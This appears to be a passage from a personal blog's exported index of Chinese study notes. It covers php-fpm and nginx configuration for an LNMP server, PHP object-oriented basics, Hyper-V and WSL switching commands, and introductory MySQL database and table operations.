&#39;ip:port&#39;、&#39;port&#39;、&#39;&#x2F;path&#x2F;to&#x2F;unix&#x2F;socket&#39;listen &#x3D; 127.0.0.1:9000; backlog数，-1表示无限制，由操作系统决定，此行注释掉就行。;listen.backlog &#x3D; 65535; unix socket设置选项，如果使用tcp方式访问，这里注释即可。listen.owner &#x3D; nginxlisten.group &#x3D; nginxlisten.mode &#x3D; 0660;listen.acl_users &#x3D;;listen.acl_groups &#x3D; ;listen.allowed_clients &#x3D; 127.0.0.1; process.priority &#x3D; -19; 如何控制子进程 对于专用服务器，pm可以设置为static; Possible Values:; static - a fixed number (pm.max_children) of child processes;; dynamic - the number of child processes are set dynamically based on the; following directives. With this process management, there will be; always at least 1 children.; pm.max_children - 子进程最大数; pm.start_servers - 启动时的进程数; pm.min_spare_servers - 保证空闲进程数最小值，如果空闲进程小于此值，则创建新的子进程; pm.max_spare_servers - 保证空闲进程数最大值，如果空闲进程大于此值，此进行清理; ondemand - no children are created at startup. Children will be forked when; new requests will connect. The following parameter are used:; pm.max_children - the maximum number of children that; can be alive at the same time.; pm.process_idle_timeout - The number of seconds after which; an idle process will be killed.; Note: This value is mandatory.pm &#x3D; dynamicpm.max_children &#x3D; 5pm.start_servers &#x3D; 2pm.min_spare_servers &#x3D; 1pm.max_spare_servers &#x3D; 3;pm.process_idle_timeout &#x3D; 10s; ; 设置每个子进程重生之前服务的请求数. ; 对于可能存在内存泄漏的第三方模块来说是非常有用的. ; 如果设置为 &#39;0&#39; 则一直接受请求, 等同于 PHP_FCGI_MAX_REQUESTS 环境变量. ; 默认值: 0pm.max_requests &#x3D; 500; FPM状态页面的网址. 如果没有设置, 则无法访问状态页面. 默认值: none. munin监控会使用到pm.status_path &#x3D; &#x2F;status; ;FPM监控页面的ping网址. ; 如果没有设置, 则无法访问ping页面. ; 该页面用于外部检测FPM是否存活并且可以响应请求. ; 请注意必须以斜线开头 (&#x2F;)。ping.path &#x3D; &#x2F;ping; 用于定义ping请求的返回响应. ; 返回为 HTTP 200 的 text&#x2F;plain 格式文本. ; 默认值: pong.;ping.response &#x3D; pong; 登录 logaccess.log &#x3D; log&#x2F;$pool.access.log; accessLog格式; Default: &quot;%R - %u %t \\&quot;%m %r\\&quot; %s&quot;access.format &#x3D; &quot;%R - %u %t \\&quot;%m %r%Q%q\\&quot; %s %f %&#123;mili&#125;d %&#123;kilo&#125;M %C%%&quot; ;慢请求的记录日志;配合request_slowlog_timeout使用slowlog &#x3D; log&#x2F;$pool.log.slow ;当一个请求该设置的超时时间后;就会将对应的PHP调用堆栈信息完整写入到慢日志中.;设置为 &#39;0&#39; 表示 &#39;Off&#39;request_slowlog_timeout &#x3D; 0 ; 设置单个请求的超时中止时间. ; 该选项可能会对php.ini设置中的&#39;max_execution_time&#39;因为某些特殊原因没有中止运行的脚本有用.; 设置为 &#39;0&#39; 表示 &#39;Off&#39;.; 当经常出现502错误时可以尝试更改此选项。request_terminate_timeout &#x3D; 0 ; 设置文件打开描述符的rlimit限制. ; 默认值: 系统定义值默认可打开句柄是1024，; 可使用 ulimit -n查看，ulimit -n 2048修改。rlimit_files &#x3D; 1024 ; 设置核心rlimit最大限制值. 可用值: &#39;unlimited&#39; 、0或者正整数. 默认值: 系统定义值.;rlimit_core &#x3D; 0 ; 启动时的Chroot目录. 所定义的目录需要是绝对路径. 如果没有设置, 则chroot不被使用.;chroot &#x3D; ; 设置启动目录，启动时会自动Chdir到该目录. ; 所定义的目录需要是绝对路径. ; 默认值: 当前目录，或者&#x2F;目录（chroot时）;chdir &#x3D; &#x2F;var&#x2F;www ; 重定向运行过程中的stdout和stderr到主要的错误日志文件中. ; 如果没有设置, stdout 和 stderr 将会根据FastCGI的规则被重定向到 &#x2F;dev&#x2F;null . ; 默认值: 空.;catch_workers_output &#x3D; yes;clear_env &#x3D; no;security.limit_extensions &#x3D; .php .php3 .php4 .php5 配置文件中文翻译 [github][https://github.com/HeDefine/PHP.ini-for-Chinese/tree/master] 6.配置nginx支持php1234567891011121314151617181920212223242526locate nginx.confvim ..文件路径#将文件第45行修改为如下内容index index.php index.html index.htm;#文件的65-72行代码前的注释“＃”去掉,并替换&quot;root&quot;和“fastcgi_param”参数值也就是，使用&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html作为网站根目录location ~ \\.php$ &#123; root &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html$fastcgi_script_name; include fastcgi_params; &#125;locate php.inivim ..文件路径#在结尾的“；Local Variables：”之前添加如下内容cgi.fix_pathinfo &#x3D; 1killall -9 php-fpmkillall -9 nginxnginxphp-fpm#重启(不会写脚本)netstat -ntlp #查看端口是否启用并被php-fpm以及nginx使用 7.查看LNMP网站环境12345678910111213cd &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;htmltouch info.phpvim info.php#加入下面内容&lt;?php phpinfo();?&gt;#写入退出ECS:wq#访问http:&#x2F;&#x2F;ip&#x2F;info.php#测试是否解析php，若成功，则配置完成 8.常见问题访问不到网站? 检查防火墙配置并ping服务器IP、telnet服务器80端口测试连通性 能访问到html文件却访问不到php文件? 安装php和配置nginx支持php的步骤是否正确。 //FILE FAILD FIND 是由于nginx配置没有配好 //所有结束后，删除info.php 9.参考文献[手动配置LNMP][https://www.jianshu.com/p/292514f97944] [阿里云开放实验室][https://edu.aliyun.com/lab/courses/14107e607fe742a88a60d1148d7b405c/detail?purchaseRecordId=4eddcaf58df543d9b96af97a5b2d9342] 0.扩展[Nginx - 维基百科][https://zh.wikipedia.org/wiki/Nginx] [8分钟带你深入浅出搞懂Nginx][https://zhuanlan.zhihu.com/p/34943332] [PHPMyadmin 配置文件详解(配置)][https://www.jb51.net/article/21228.html]","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"PHP面向对象","date":"2019-05-19T16:00:00.000Z","path":"2019/05/20/Note/PHP面向对象/","text":"PHP面向对象为什么要面向对象面向对象的好处远远不只是便于维护代码，他所体现的面向对象的思想将一个体系分作很多的个体，这样来，别人只需要知道怎么调用你所写的类或对象。 类和对象：类： 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。对象：是类的实例。具体一点，有一个类是人类，这个人类就是抽象的，而张三这个人就是实例化的对象。类是对象的模板，对象是类的实例成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。类结构 1234class classname&#123;&#125; 类的基本定义： 12345class classname&#123; 成员属性&#x2F;&#x2F;前面有访问控制符 public protected private 成员方法&#125; 创建对象 1$对象名 &#x3D; new 类名（）； 类名不区分大小写，采用驼峰式 访问对象的属性 1$对象名-&gt;$属性名 对象传递机制说明对象传递的不是数据本身，而是对象标识符这里有两个有趣的例子 123456789101112131415class cat&#123; public $name; public $age; public $color;&#125;$a &#x3D; new cat();$a-&gt;name &#x3D; &#39;Tom&#39;;$a-&gt;age &#x3D; &#39;2&#39;;$a-&gt;color &#x3D; &#39;red&#39;;$b &#x3D; $a;echo $b-&gt;color;$b-&gt;name &#x3D; &quot;Sam&quot;;echo $a-&gt;name; 在这里，你会发现输出的a的name居然随着b的修改而变化了这是应为，这种传值是传对象标识符，相当于在创建$a的时候就创建了一个#1的对象标识符，对$b来说他只是复制了一份和$a一模一样的对象标识符指向数据存储的位置，所以会得到那种结果啦 下面这个有点不同，仔细分析一下结果吧 123456789101112131415class cat&#123; public $name; public $age; public $color;&#125;$a &#x3D; new cat();$a-&gt;name &#x3D; &#39;Tom&#39;;$a-&gt;age &#x3D; &#39;2&#39;;$a-&gt;color &#x3D; &#39;red&#39;;$b &#x3D; &amp;$a;&#x2F;&#x2F;传址$b &#x3D; &#39;blue&#39;;echo $a-&gt;color;&#x2F;&#x2F;会报错哦echo $a; 成员函数基本样式 123456class classname&#123; 访问修饰符 function 函数名(参数)&#123; alalalal; &#125;&#125; 构造函数在class里面的构造函数构造函数嘛，用于创建对象时给属性赋初始值和调用成员函数构造函数的访问修饰符默认为public没有返回值一个类中只能有一个构造函数样式： 12345678910class classname&#123; public $color; public $age; 访问修饰符 function __construct($param_color,$param_age)&#123; $this-&gt;color &#x3D; $param_color; $this-&gt;age &#x3D; $param_age;&#x2F;&#x2F;$this代表调用这个构造函数的对象 &#125;&#125;$coco &#x3D; new classname(&#39;red&#39;,&#39;12&#39;);&#x2F;&#x2F;在创建这个新的对象Coco时系统自动完成了对象的属性定义 析构函数析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数释放资源，关闭文件默认情况下，先创建的对象后销毁（栈区的分配） 123456class classname&#123; function __destruct()&#123;&#x2F;&#x2F;No param &#125;&#125; 在程序结束前也会销毁对象当没有变量指向对象，这个对象就会被销毁在销毁时就会调用析构函数析构函数并不是销毁对象本身，而是销毁对象创造的相关资源，如数据库连接PHP的内存回收机制 123456789101112131415&lt;?phpclass test&#123; function __destruct()&#123; echo &quot;当对象销毁时会调用！！！&quot;; &#125;&#125;$a &#x3D; $b &#x3D; $c &#x3D; new test();$a &#x3D; null;unset($b);echo &quot;&lt;hr &#x2F;&gt;&quot;;?&gt; 此例子，如上图，有三个变量引用$a,$b,$c指向test对象，test对象就有3个引用计数，当$a = null时，$a对test对象的引用丢失，计数-1，变为2，当$b被unset()时，$b对test对象的引用也丢失了，计数再-1，变为1，最后页面加载完毕，$c指向test对象的引用自动被释放，此时计数再-1，变为0，test对象已没有变量引用，就会被销毁，此时就会调用析构函数。访问修饰符初讲类中的方法可以被定义为公有（public），私有(private)或受保护(protected)。如果没有设置这些关键字，则该方法默认为公有。其中，public定义的方法或属性在类的内部和外部都可以调用或读取private和protected只能在类的内部调用或读取，他们的不同后面讲解。 魔术方法__set()调用条件：在类的外部对受保护的或者私有的属性赋值可以对程序有更好的控制 123456789101112131415161718192021class Dog&#123; public $name; public $age; public $sex; public function __construct($name,$sex)&#123;&#x2F;&#x2F;这里没有问题，$sex只是个参数哦，什么名字都行 $this-&gt;name &#x3D; $name;&#x2F;&#x2F;但是为了方便阅读，还是尽量规范参数的命名 $this-&gt;age &#x3D; $sex; &#125; public function __set($name,$value)&#123; $this-&gt;$name &#x3D; $value; &#125;&#125;&#x2F;&#x2F;在类的外部$coco &#x3D; new Dog(&quot;titi&quot;,1);echo $coco-&gt;name;echo $coco-&gt;age;$coco-&gt;age &#x3D; 2;$coco-&gt;name&#x3D;&quot;coco&quot;;echo $coco-&gt;name;echo $coco-&gt;age; 不光可以对其赋值，还可以完成对值的一些操作比如判断要修改的值是否符合修改要求等等，下面的几个魔术方法也一样__get调用条件：在类的外部得到受保护的或私有的属性的值 1234567891011121314151617class Dog&#123; public $name; private $age; public function __construct($value1,$value2)&#123; $this-&gt;nmae &#x3D; $value1; $this-&gt;age&#x3D; $value2; &#125; public function __get($name)&#123; return $this-&gt;$name; &#125;&#125;&#x2F;&#x2F;在类的外部$coco &#x3D; new Dog(&quot;titi&quot;,1);echo $coco-&gt;name;echo $coco-&gt;age; __isset()调用条件：在外部 isset()受保护的或者私密的属性 123456789101112131415class Dog&#123; public $name; private $age; public function __construct($name,$age)&#123; $this-&gt;nmae &#x3D; $name; $this-&gt;age &#x3D; $age; &#125; public function __isset($name)&#123; isset($this-&gt;$name); &#125;&#125;&#x2F;&#x2F;在类的外部$coco &#x3D; new Dog(&quot;titi&quot;,1);var_dump(isset($coco-&gt;age));&#x2F;&#x2F;这个返回true 或者faulse __unset调用条件：在外部释放受保护的或者私密的属性 12345678910111213141516class Dog&#123; public $name; private $age; public function __construct($name,$sex)&#123; $this-&gt;nmae &#x3D; $name; $this-&gt;sex &#x3D; $sex; &#125; public function __unset($name)&#123; unset($this-&gt;$name); &#125;&#125;&#x2F;&#x2F;在类的外部$coco &#x3D; new Dog(&quot;titi&quot;,1);unset($coco-&gt;$age);var_dump(($coco); 继承父类：一个类被其他类继承，可将该类称为父类，或基类，或超类。子类：一个类继承其他类称为子类，也可称为派生类。访问修饰符补充：public,protected修饰的方法和属性可被继承，而private不可值得注意的是，PHP中，如果在子类中创建了构造函数，则子类不会在构造函数中隐式调用父类中的构造函数，要执行父类的构造函数，需要在子类的构造函数中调用parent::__construct()。如果子类中没有定义构造函数则会如同普通类一样从父类继承（非private） 1234567891011121314151617181920212223242526class A&#x2F;&#x2F;父类&#123; public $name; private $age; protected $job; function __construct($name,$age,$job) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; $age; $this-&gt;job &#x3D; $job; &#125; public function speak()&#123; echo &quot;hello&quot;.$this-&gt;name; &#125;&#125;class B extends A&#x2F;&#x2F;子类&#123; public function eat()&#123; echo &quot;&lt;br &#x2F;&gt;eat&quot;.$this-&gt;job;&#x2F;&#x2F;如果是age会如何呢？ &#125;&#125;$a &#x3D; new B(&quot;Tom&quot;,18,&quot;student&quot;);$a-&gt;speak();$a-&gt;eat(); 方法重写如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。抽象方法和抽象类含有抽象方法的一定是抽象类抽象类不一定含有抽象方法抽象类中可以有一般的函数抽象类无法实例化，只能由一个继承他的子类实例化，继承他的子类将实现所有的抽象方法（重写）抽象体 123456789101112abstract class Father&#123; public abstract function run();&#x2F;&#x2F;抽象方法是没有方法体的 public function eat()&#123;&#x2F;&#x2F;这个就是个普通的成员方法（函数） echo &quot;eat&quot;; &#125;&#125;class son extends Father&#123; public function run()&#123; &#x2F;&#x2F;父债子偿 &#125;&#125; 抽象类其实就是介于普通类和接口之间的一个类，普通类需要实现所有方法，接口所有方法都不需要实现，而抽象类可以根据自己的需要去选择实现部分方法；但是一旦类里面有抽象方法，这个类就必须是抽象类，另外注意，抽象类跟接口一样，不能直接实例化为对象，只能被普通类继承，，其实抽象类同样体现了面向对象的多态现象注意：有什么可以实现类似多重继承的东西呢？接下来介绍接口接口：interface接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。 接口是一种对象用于与外界进行交互行为的约束，对于实现接口的类，要求一定要满足接口所指定的方法，也可以成为满足接口的“特征”。OOP中类有一种性质叫“封装”，就是要求类内部与外界环境要进行隔离，而类又需要实现一定的业务功能，因此就需要暴露出能够对外界产生影响的部分，这部分就被称之为接口。 ——–许致中大佬 我的理解：相当于一个菜单，列出了里面的功能，功能怎么实现外界不用管，只要用就可以 接口中定义的所有方法都必须是公有，这是接口的特性。要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称 1234567891011121314151617interface C&#123; function run();&#x2F;&#x2F;因为公有是默认值，so略&#125;interface E&#123; function walk();&#125;class D implements C,E&#123; function run()&#123; echo &quot;&lt;br&#x2F;&gt;run&quot;; &#125; function walk()&#123; echo &quot;&lt;br&#x2F;&gt;walk&quot;; &#125;&#125; 有没有一种方法是既能实现类似多继承又能不带来麻烦呢？Trait很像接口，但是接口中的方法都是不会写的，只是放了一个定义，但是Trait就会在定义这个方法的时候写好具体的操作，例子如下 12345678910traittrait能在定义一个标准类的时候定义它的方法trait SayWorld &#123; public function sayHello() &#123; echo &#39;Hello World!&#39;;&#x2F;&#x2F;trait中的 &#125;&#125;class MyHelloWorld extends Base &#123; use SayWorld;&#x2F;&#x2F;&#125; 优先级当前类中的方法或属性大于trait中的大于父类中的 123456789101112131415161718192021222324&lt;?phpclass Base &#123; public function sayHello() &#123; echo &#39;Hello &#39;;&#x2F;&#x2F;父类中的 &#125;&#125;trait SayWorld &#123; public function sayHello() &#123; echo &#39;World&#39;;&#x2F;&#x2F;trait中的 &#125;&#125;class MyHelloWorld extends Base &#123; use SayWorld; public function sayHello()&#123;&#x2F;&#x2F;当前类的 echo &#39;!&#39;; &#125;&#125;$o &#x3D; new MyHelloWorld();$o-&gt;sayHello();&#x2F;&#x2F;输出结果是 !?&gt; 引用多个trait 12345678910111213141516171819&lt;?phptrait Hello &#123; public function sayHello() &#123; echo &#39;Hello &#39;; &#125;&#125;trait World &#123; public function sayWorld() &#123; echo &#39;World&#39;; &#125;&#125;class MyHelloWorld &#123; use Hello, World; public function sayExclamationMark() &#123; echo &#39;!&#39;; &#125;&#125;","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"php","slug":"php","permalink":"https://yanmymickey.github.io/tags/php/"}]},{"title":"Mysql数据库","date":"2019-05-19T16:00:00.000Z","path":"2019/05/20/Note/解决虚拟机与hyper-v冲突/","text":"虚拟机与hyper-v冲突 通过命令关闭Hyper-V（控制面板关闭Hyper-V起不到决定性作用，要彻底关闭Hyper-V） 以管理员身份运行Windows Powershell (管理员)（Windows键+X） 运行下面命令并重启电脑： 12#关闭hype-Vbcdedit &#x2F;set hypervisorlaunchtype off 想要使用wsl时,下面是相关命令 12345678910111213#启用hype-Vbcdedit &#x2F;set hypervisorlaunchtype auto start#转换ubuntu的wsl版本wsl --set-version Ubuntu 2#查询已经安装的wsl版本wsl -l -V#或者wsl --list --version#设置wsl默认启动版本wsl --set-default-version 2","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"mysql","slug":"mysql","permalink":"https://yanmymickey.github.io/tags/mysql/"}]},{"title":"Mysql数据库","date":"2019-05-19T16:00:00.000Z","path":"2019/05/20/Note/讲数据库/","text":"Mysql数据库1.熟悉基本的linux下的命令行，运用他们。 前言了解一些名词。（菜鸟教程上解释的很清楚） 数据库: 数据库是一些关联表的集合。 数据表: 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。 列: 一列(数据元素) 包含了相同的数据, 例如邮政编码的数据。 行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。 冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。 主键：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。 外键：外键用于关联两个表。 复合键：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。 索引：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。 参照完整性: 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性 表头(header): 每一列的名称; 列(col): 具有相同数据类型的数据的集合; 行(row): 每一行用来描述某条记录的具体信息; 值(value): 行的具体信息, 每个值必须与该列的数据类型相同; 键(key): 键的值在当前列中具有唯一性 退出 exit 或 quit。 1.mysqlMySQL基础知识MySQL经常和“数据库”连在一起读，这很容易对新手造成误解，认为MySQL就是一个数据库 其实不是这样，MySQL是数据库的集合，MySQL里面有很多数据库 那么数据是直接存在数据库里的吗？并不，数据库底下还有一个叫做数据表的存储单元 数据表里面才存储数据。 打个比方，好比一座大图书馆，就是MySQL，图书馆里面分南库，北库，这就是数据库， 每个库里面的书都是放在书架上的，书架就是数据表，而放在书架上的很多本书，就是数据 。这么说，读者应该理解了吧，所以按大小顺序排个序就应该是， MySQL&gt;数据库&gt;数据表&gt;数据，所以我们接下来的内容也是按照这个顺序来展开。（把黑体理解就好） 前面跟着颜老板把那个环境安装好了，然后就可以使用mysql了。首先打开xshell， 1.进入你的mysqlmysql -u root -p #然后[root@** ~]后面输入 -u 是指user用户名， root是你创建了一个root用户，最高管理员进入。 -p是要你输入你的mysql密码。 #回车Enter password: 然后输入你的密码 #（这里你输入的时候是看不见的，linux是有这个保护，以免泄密，windows系统下一般不会 有这个。输入后然后回车。） 讲解root为什么，这是管理员登录，可以进行好多操作，增删改查。 你也可以创建一个用户不是root。然后给他权限，进行登录。具体可以参照 （菜鸟教程/数据库/mysql/mysql管理）， 就有这个出现，有的版本不一样，但是大致是一样的。 Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 2Server version: 5.7.25-log MySQL Community Server (GPL) Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners. Type ‘help;’ or ‘\\h’ for help. Type ‘\\c’ to clear the current inpu. MySQL [(none)] &gt; MySQL [(none)] &gt;这个none是你还没有选择数据库。有的版本有有的没有。 选择了数据库就是MySQL [(xx)] &gt;. 2.展示你的数据库show databases; #因为你不知道你刚开始有多少的数据库，所以是databases 而且一定要记住，输入；因为之前配环境的时候的语句没有后面加;的习惯，所以菜鸡本鸡刚开始的时候就常常忘记加；导致它以为我还有东西要输入，另起一行。 出现这四个初始数据库 +——————–+| Database |+——————- -+| information_schema || mysql || performance_schema || sys |+——————–+ 3.创建你的数据库create database XX; (XX是数据库名)这个数据库名你可以随便取，但是不能取一些关键字，例如create show类似的 输入后回车然后看见 Query OK,1 row affected (0.00 sec) #表示创建数据库成功。 在这里给大家补充一点，创建数据库的时候，默认的字符是”latin“，也就是拉丁文，现在可能体会不到有什么区别，到数据表的操作的时候就有区别了。 不过这里还是告诉大家，如何创建数据库的时候，自己定义为什么字符 create database XX(数据库名) charset = (字符编码，例如utf8); #我们平时学的中文的字符编码是“utf-8”，但是在MySQL里面，中文字符编码是“utf8”，这点需要注意。 还有一点，要是你创建一个已经存在的数据库会报错。例如： create database test; 会提示以下信息 can’t create database ‘test’ ;database exists 所以我们在创建数据库的时候最好判断一下子，你要创建的数据库到底存不存在。 create database if not exists XX(数据库名); #尝试创一个test的数据库试试 会出现Query ok,1 row affected ,1 warning. 显示“OK”，没有报错了，但是有一个警告，这个警告就是告诉用户，”test“这个数据库存在。 现在让我们尝试一下创建一个关键字的数据库， create database create; 会出现You have an error in your SQL syntax;check the manual that correspands to your ……………….to use near ‘create’ at line 1 这里我们可以确实看到的是，名为“create”的这个数据库没有创建成功，报错了. 那如果有的人说我就想创建一个名为“create”的数据库，下面给出解决办法 **create database XX(数据库名);(**注意，这里``是反引号，在键盘tab上面,1的旁边) 这样操作就可以创建一个名叫做create的数据库了，但是最好不要起这些关键字名字，不好区别。 4.显示数据库信息show create database XX(数据库名); 查看信息。CHARACTER SET 当然在这里你可以修改你的字符编码。使用 1234alter database dbname CHARACTER SET utf8 COLLATE utf8_general_ci;utf8_general_ci这是一个校对规则。然后在使用哪个查看数据库就可以看到，你的数据库的编码就变成了utf8; 5.删除数据库drop database XX(数据库名); 删除了会显示 Query ok, 0 rows affected #这样就显示删除成功了。 但是如果我们要删除一个并不存在的数据库会出现什么呢 删除一个不存在的q数据库。回车显示 can’t drop database ‘q’; database doesno’t exist 很明显，报错了，因为不存在“a”这个数据库，我们可以判断一下，这个数据库存在才删除，下面给出代码。跟创建一样的 drop database if exists XX (数据库名字); 会显示 Query OK, 0 rows affected, 1 warning (0.01 sec) 和之前创建一样，虽然是成功的，但是有警告。警告的意思大概是说，么有这个数据库，。。 6.选择数据库这是数据库的最后一个基本操作，我们如果想要创建数据，必须要创建一个数据库，然后在数据库当中创建数据表，在数据表中进行操作， 但是这么多数据库，计算机怎么知道我们选择的是哪个数据库呢？我们使用下列语句 use XX(数据库名); 回车后会显示 Database changed 这个就提示你已经进入到了这个XX数据库里面了。然后你就可以操作了。 数据表数据表的基本操作全都是在选择了数据库的前提下,一定要在选择了数据库的前提下。 1.创建表create table XX(表名)(字段1名 数据类型，字段2名 数据类型,…….字段n名 数据类型); 这个创建表可以打个比方，如果要你用Excel做一份班级成绩表，你会怎么做？肯定先有个标题吧，比方说“18级网络二班期末成绩表”，这里的标题就相当于我们的表名。标题有了，我们得在第一行写上“学号”、“姓名”、“总成绩”吧，来告诉看这个表的人，每一列代表的什么东西，这里的“学号”、“姓名”、“总成绩”就相当于我们的字段名。到这里，都这应该对这段代码有所了解了，下面我们创建一个数据表。 MySQL [qq1]&gt; create table stu(-&gt; id varchar(20),-&gt; name varchar(10),-&gt; score int-&gt; ); 回车之后显示 Query OK, 0 rows affected (0.09 sec) 表示已经成功创建一个表了。这里注意写一行别忘记 , 和最后的 ；不然出错了又要重新敲一次。 这里讲一讲mysql数据类型的知识。 数据类型：int 整型tinyint 整型（0-256）decimal 浮点型（总位数，小数位数） 例如 decimal(3,1)char(X) 定长字符型 例如 char(10)varchar(X) 可变长度字符型 例如varchar（10）text 大段文本 binary 二进制（存储照片等） 和C语言类似。 字段属性： null:空not null:不为空default ‘XXXX’：默认值auto_increment：自动增长primary key：主键(主键的特点，不为空，不重复,一个表只能有一个主键，但是一个主键可以由多个列组成) 具体的没必要多说，只要了解常用的数据类型即可。现在我可以讲讲“Latin”和“utf8”的区别了，如果是在“Latin”字符下创建的数据表，那么一个中文等于两个字符，也就相当于，如果名字是四个字，就要char（8）。但如果是在“utf8”字符下创建的数据表，一个中文等于一个字符，如果名字是四个字，只需要char（4）就够了。 还有如果你还是要用关键字创建字段名或者表名的话，和之前一样要用`` 2.查看表show tables; 一定要是tables，因为一个MySQL里面有多个数据库，所以，一个数据库里面也可以有多个表，当然，一个表里面也可以有多个数据，但是只有一个表的话，也要使用tables，也可以使用后面的显示创建的表。 回车之后会显示你刚刚创建的表 +—————+| Tables_in_qq1 |+—————+| stu |+—————+1 row in set (0.00 sec) 3.显示创建表show create table XX(表名);show create table XX(表名) \\G; 上面两段代码都是显示创建表，只不过显示的样式不同，随意选择一种即可 上面那种会显示 +——-+————————————————————————————————————————————————————-+ Table Create Table +——-+————————————————————————————————————————————————————–+ stu CREATE TABLE stu ( id varchar(20) DEFAULT NULL, name varchar(10) DEFAULT NULL, score int(11) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8 +——-+————————————————————————————————————————————————————–+ 1 row in set (0.00 sec) 下面那种会显示 ******************\\*** 1. row ******************\\***Table: stuCreate Table: CREATE TABLE stu (id varchar(20) DEFAULT NULL,name varchar(10) DEFAULT NULL,score int(11) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf81 row in set (0.00 sec) ERROR:No query specified ##记得百度ERROR； 4.显示表的结构describe(或desc) XX(表名); 回车之后会显示刚刚我创建的表的结构 +——-+————-+——+—–+———+——-+| Field | Type | Null | Key | Default | Extra |+——-+————-+——+—–+———+——-+| id | varchar(20) | YES | | NULL | || name | varchar(10) | YES | | NULL | || score | int(11) | YES | | NULL | |+——-+————-+——+—–+———+——-+3 rows in set (0.00 sec) 解释每个表头的含义 其中 id ,name,score都是字段，然后varchar什么的都是字段的内型。 因为现在什么都没有写进去，所以是空的。key是说是不是主键。 5.删除表drop table XX(表名);*drop table XX,XX,XX……; 在这里因为后面还要用到表，我们只创建了一个表，所以我们再创建一个表， MySQL [qq1]&gt; create table stu1(-&gt; id varchar(20),-&gt; name varchar(10),-&gt; score int-&gt; ); 来演示删除 创建好了之后查看一下表的多少（show tables;）。 回车之后显示 Query OK, 0 rows affected (0.04 sec) #表示删除成功。 我们再来查看一下表。发现少了一个，表示删除成功。 数据的基本操作数据的操作算是整个MySQL中最复杂的部分，虽然概括起来无非就是“增删查改”，但每一项底下包含的内容非常之多，我比较菜，所以尽力而为。 1.插入数据这个要在表的底下实现，所以要先有个表 1insert into XX（表名） (字段1,字段2,字段3......) values (值1,值2,值3.......); 比如在自己的stu表中插入一些信息 insert into stu (id,name,score) values(“201801”,”某某”,90); 千万要注意不要写入中文符号，不然会报错，千万千万。 回车之后有下面一段代码，显示成功插入数据 Query OK, 1 row affected (0.00 sec) 我们再插入几条信息 insert into stu (id,name,score) values(“201820”,”嘿嘿”,70); insert into stu (id,name,score) values(“201830”,”lala”,90); 然后看下面的查询数据 2.查询数据让大家看一下插入数据之后，表内变成什么样了， 首先给大家介绍一个知识点——运算符比较运算符 &gt;、&gt;=、&lt;、&lt;=、=（比较和赋值都是”=”）、&lt;&gt;（不等于） 逻辑运算符 非（not） and（与）or（或） 和C语言差不多，但是有的有区别，不要混淆。 1、查询一个表里面的数据select * from XX（表名）; 我们 来查询刚刚创建的表的数据 select * from stu; 回车显示内容 +——–+——–+——-+| id | name | score |+——–+——–+——-+| 201801 | 某某 | 90 || 201810 | 啥啥 | 80 || 201810 | 啥啥 | 80 || 201820 | 嘿嘿 | 70 |+——–+——–+——-+4 rows in set (0.00 sec) 2、查询一个表里面某字段 的所有数据select 字段1,字段2,字段3……（或用”*”代替所有字段） from XX（表名）; 举个例子，我们查询“id”字段底下所有的数据，那么”id“下有哪些数据，就会展现出来 select id from stu; 回车显示这个表里面id字段下的所有的数据 +——–+| id |+——–+| 201801 || 201810 || 201810 || 201820 |+——–+4 rows in set (0.00 sec) 3.我们也可以根据条件来查询信息select * from XX（表名）where 字段1 = 值1 and 字段2 = 值2 and ……; 例如我们来查询stu里面name是某某的并且score是90的人 select * from stu where score =90 and name=”某某”; 回车显示内容 +——–+——–+——-+| id | name | score |+——–+——–+——-+| 201801 | 某某 | 90 |+——–+——–+——-+1 row in set (0.02 sec) 4.我们也可以搜索select * from stu where score &gt; 90 or score &lt; 60; 这个就是查找表中分数在90以上或者60以下的人 要是没有的话，就会显示这段信息。 Empty set (0.00 sec) 这个就是查找表中分数在80以上或者60以下的人 +——–+——–+——-+| id | name | score |+——–+——–+——-+| 201801 | 某某 | 90 |+——–+——–+——-+1 row in set (0.00 sec) 5.对数据进行排序select * from XX（表名） order by 字段x asc;（默认就是升序，低————高） 这里演示一个按照id序号来排序。 select * from stu order by id asc; 回车之后显示 +——–+——–+——-+| id | name | score |+——–+——–+——-+| 201801 | 某某 | 90 || 201810 | 啥啥 | 80 || 201810 | 啥啥 | 80 || 201820 | 嘿嘿 | 70 |+——–+——–+——-+ select * from XX（表名） order by 字段x desc; （高———低） select * from XX（表名） where 字段x = 值x oreder by 字段x asc(desc); （按照某种条件排序） select * from XX（表名） limit n; （取前n条数据） 